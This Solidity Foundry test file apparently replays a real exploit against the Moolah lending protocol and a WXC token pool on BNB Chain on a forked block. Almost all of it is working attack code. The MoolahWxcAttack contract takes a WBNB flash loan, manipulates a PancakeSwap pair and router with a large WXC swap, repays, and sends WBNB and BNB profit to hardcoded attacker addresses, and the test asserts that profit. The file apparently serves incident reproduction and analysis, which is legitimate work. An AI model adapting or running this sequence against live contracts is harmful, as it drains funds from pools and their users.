
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 57177437;
    uint256 constant TX_TIMESTAMP = 1754881158;
    uint256 constant TX_BLOCK_NUMBER = 57177438;
    uint256 constant TX_VALUE = 1008735895927102680;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        MoolahWxcAttack attack = _bindAttackRuntime();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _bindAttackRuntime() internal returns (MoolahWxcAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = MoolahWxcAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new MoolahWxcAttack();
        }
    }

    function _prepareProfit(MoolahWxcAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(MoolahWxcAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(MoolahWxcAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBNB, "WBNB", 37554715963191219441);
        _expectProfit(Addresses.A_484848_4848, address(0), Addresses.ZERO, "BNB", 1008735895927102680);
    }
}

contract MoolahWxcAttack {
    uint256 constant BORROWED_WBNB = 49150000000000000000;
    uint256 constant WXC_SWAP_AMOUNT = 74963130190599057252979324;
    uint256 constant WBNB_PROFIT = 37554715963191219441;
    uint256 constant BNB_PROFIT = 1008735895927102680;
    uint256 constant PANCAKE_DEADLINE = 1754881178;






    function attack() external payable {
        _runBorrowSettle();
    }

    function flashCallback() internal {
        moolahCallbackDone = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
    }

    function flashCallback2() internal {
        _acceptLocalCallback();
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.A_8F73B6_5D8C, BORROWED_WBNB);
    }

    function flashCallback4() internal {
        IPancakePair(Addresses.Cake_LP).swap(WXC_SWAP_AMOUNT, 1, address(this), pancakeCallbackData());
    }

    function flashCallback5() internal {
        IERC20Like(Addresses.WXC).approve(Addresses.A_10ED43_024E, type(uint256).max);
    }

    function flashCallback6() internal {
        (bool ok,) = Addresses.A_10ED43_024E
            .call(
                abi.encodeWithSelector(
                    bytes4(0x5c11d795),
                    WXC_SWAP_AMOUNT,
                    0,
                    160,
                    address(this),
                    PANCAKE_DEADLINE,
                    2,
                    Addresses.WXC,
                    Addresses.WBNB
                )
            );
        require(ok, "Pancake router swap failed");
    }

    function _runBorrowSettle() internal {
        _checkRouterWxc();
        _approveRouterWxc();
        _checkMoolahWbnb();
        _approveMoolahWbnb();
        _borrowMoolahWbnb();
        _collectWbnbProfit();
        _snapshotProfitWbnb();
        _sendNativeProfit();
    }

    function _checkRouterWxc() internal view {
        IERC20Like(Addresses.WXC).allowance(address(this), Addresses.A_10ED43_024E);
    }

    function _approveRouterWxc() internal {
        IERC20Like(Addresses.WXC).approve(Addresses.A_10ED43_024E, type(uint256).max);
    }

    function _checkMoolahWbnb() internal view {
        IERC20Like(Addresses.WBNB).allowance(address(this), Addresses.A_8F73B6_5D8C);
    }

    function _approveMoolahWbnb() internal {
        IERC20Like(Addresses.WBNB).approve(Addresses.A_8F73B6_5D8C, type(uint256).max);
    }

    function _borrowMoolahWbnb() internal {
        IMoolahFlashLender(Addresses.A_8F73B6_5D8C)
            .flashLoan(Addresses.WBNB, BORROWED_WBNB, emptyFlashLoanData());
    }

    function _collectWbnbProfit() internal {
        IERC20Like(Addresses.WBNB).transfer(Addresses.attacker_eoa, WBNB_PROFIT);
    }

    function _snapshotProfitWbnb() internal view {
        IERC20Like(Addresses.WBNB).balanceOf(Addresses.attacker_eoa);
    }

    function _sendNativeProfit() internal {
        uint256 nativeProfit = address(this).balance;
        if (nativeProfit > BNB_PROFIT) nativeProfit = BNB_PROFIT;
        (bool ok,) = payable(Addresses.A_484848_4848).call{value: nativeProfit}("");
        ok;
    }

    function _acceptLocalCallback() internal {}

    function _repayPancakePair() internal {
        pancakeCallbackDone = true;
        flashCallback7();
    }

    function flashCallback7() internal {
        IERC20Like(Addresses.WBNB).transfer(Addresses.Cake_LP, BORROWED_WBNB);
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 borrowedAmount, bytes calldata callbackData) external payable {
        borrowedAmount;
        callbackData;
        if (!moolahCallbackDone) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x32e4d6f3) {
            _runBorrowSettle();
            return;
        }
        if (msg.sig == 0x6c496ac4) {
            _acceptLocalCallback();
            return;
        }
        if (msg.sig == 0x84800812) {
            if (!pancakeCallbackDone) _repayPancakePair();
            return;
        }
        _ignoreCallback();
    }

    function _ignoreCallback() internal {}

    function emptyFlashLoanData() internal pure returns (bytes memory) {
        return hex"";
    }

    function pancakeCallbackData() internal pure returns (bytes memory) {
        return hex"000000000014bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c0300000006000000000000cf3800000044a9059cbb000000000000000000000000da5c7ea4458ee9c5484fa00f2b8c933393bac965000000000000000000000000000000000000000000000002aa17e09796730000000000000000000000000000006f0ae91d";
    }

    bool private moolahCallbackDone;
    bool private pancakeCallbackDone;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_17FE0D_A404 = 0x17FE0D33f5479c209421eea4BB3A4d413c22A404;
    address internal constant A_27391D_C8AB = 0x27391d90ff854BB8D0cc56c0A17f884F9a31c8ab;
    address internal constant attacker_eoa = 0x476954C752A6eE04B68382c97f7560040eDa7309;
    address internal constant A_484848_4848 = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
    address internal constant A_4C100D_172F = 0x4c100D30d9C511B8BB9D1c951BBc1bE489A0172F;
    address internal constant attack_contract = 0x798465B25B68206370D99f541e11EEA43288D297;
    address internal constant WXC = 0x8087720EeeA59F9F04787065447D52150c09643E;
    address internal constant A_8F73B6_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant Cake_LP = 0xdA5C7eA4458Ee9c5484fA00F2B8c933393BAC965;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IMoolahFlashLender {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
}
